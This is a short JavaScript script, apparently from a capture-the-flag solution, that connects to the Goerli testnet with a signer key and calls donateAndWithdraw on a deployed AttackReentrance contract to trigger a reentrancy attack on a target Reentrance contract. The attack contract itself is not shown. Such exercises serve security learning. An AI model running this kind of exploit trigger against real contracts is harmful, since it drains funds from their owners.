require("dotenv").config()

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const REENT_ADDRESS = "0x345A26779763df3eF98E3Dd56ca6D5af64f2F882";
const ATTACK_REENT = "0x4e41Ce8d815E0340E3e11fcf8fD36575DB1c810A"

const contractABI = require("../artifacts/contracts/AttackReentrance.sol/AttackReentrance.json");

// Provider
const provider = ethers.getDefaultProvider('goerli');

// Signer
const signer = new ethers.Wallet(PRIVATE_KEY, provider);

// Contract
const attackReentrance = new ethers.Contract(ATTACK_REENT, contractABI.abi, signer);


async function main() {
  const value = ethers.utils.parseEther("0.001")
  const tx = await attackReentrance.donateAndWithdraw({value: value});

}

main();
